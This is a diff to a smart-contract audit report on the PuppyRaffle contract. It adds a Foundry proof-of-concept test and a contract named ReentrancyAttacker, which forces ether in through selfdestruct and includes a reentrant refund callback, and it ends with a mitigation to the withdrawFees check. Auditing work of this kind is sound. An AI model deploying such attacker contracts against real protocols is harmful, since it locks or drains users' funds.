@@ -76,6 +76,10 @@
             idx = raffle.getActivePlayerIndex(address(this));
         }
 
+        function destruct(address _address) external onlyOwner {
+            selfdestruct(payable(_address));
+        }      
+
         receive() external payable {
             if (address(raffle).balance > 0) {
                 raffle.refund(idx);
@@ -326,9 +330,97 @@ function testDosOnEnterRaffle() public {
 
 **Impact:** Due to the discrepancy, the contract will never truly be empty, and it limits `PuppyRaffle::feeAddress`' ability to withdraw any ether from the contract, resulting in operational inefficencies.
 
-**Proof of Concept:**
+**Proof of Concept:** Add the following test to `PuppyRaffleTest.t.sol`,
 
-**Recommended Mitigation:** 
+<details>
+
+<summary>PoC</summary>
+
+```javascript
+
+    function testCheckWithdrawalInoperability() public playersEntered {
+        address alice = makeAddr("alice");
+        deal(alice, 1 ether);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // 0.8 ether -> totalFees
+        puppyRaffle.selectWinner();
+
+        // contract balance: 0.8 ether. 
+        // Total fees: 0.8 ether.
+        console.log("Contract balance before attack: %s" ,address(puppyRaffle).balance);
+        console.log("Contract totalFees before attack: %s" ,puppyRaffle.totalFees());
+
+        vm.startPrank(alice);
+        ReentrancyAttacker attacker = new ReentrancyAttacker{value:1 ether}(address(puppyRaffle));
+        // Send 1 ether to puppy raffle through selfdestruct
+        attacker.destruct(address(puppyRaffle));
+        vm.stopPrank();
+
+        // Discrepancy
+        // contract balance: 1.8 ether. 
+        // Total fees: 0.8 ether.
+        console.log("Contract balance after attack: %s" ,address(puppyRaffle).balance);
+        console.log("Contract totalFees after attack: %s" ,puppyRaffle.totalFees());
+
+        assertLt(puppyRaffle.totalFees(), address(puppyRaffle).balance);
+
+        vm.expectRevert();
+        puppyRaffle.withdrawFees();
+    }
+
+    contract ReentrancyAttacker {
+        PuppyRaffle public raffle;
+        uint256 constant entranceFee = 1e18;
+        uint256 public idx;
+
+        address private owner;
+
+        modifier onlyOwner() {
+            require(msg.sender == owner, "You are not the owner");
+            _;
+        }
+
+        constructor(address _raffle) payable {
+            raffle = PuppyRaffle(_raffle);
+            owner = msg.sender;
+        }
+
+        function setIdx() external onlyOwner {
+            idx = raffle.getActivePlayerIndex(address(this));
+        }
+
+        function destruct(address _address) external onlyOwner {
+            selfdestruct(payable(_address));
+        }
+
+        receive() external payable {
+            if (address(raffle).balance > 0) {
+                raffle.refund(idx);
+            }
+        }
+    }
+
+```
+</details>
+
+
+**Recommended Mitigation:** Consider updating the require statement so it reverts only when contract balance is less than total fees accumulated.
+
+```diff
+
+    function withdrawFees() external {
+-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
++       require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
+        uint256 feesToWithdraw = totalFees;
+        totalFees = 0;
+        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
+        require(success, "PuppyRaffle: Failed to withdraw fees");
+    }
+
+```
 
 ### [L-01] `PuppyRaffle::getActivePlayerIndex()` returning 0 for inactive players can mislead an active user at index 0, thereby undermining intended functionlity of the function. 
 
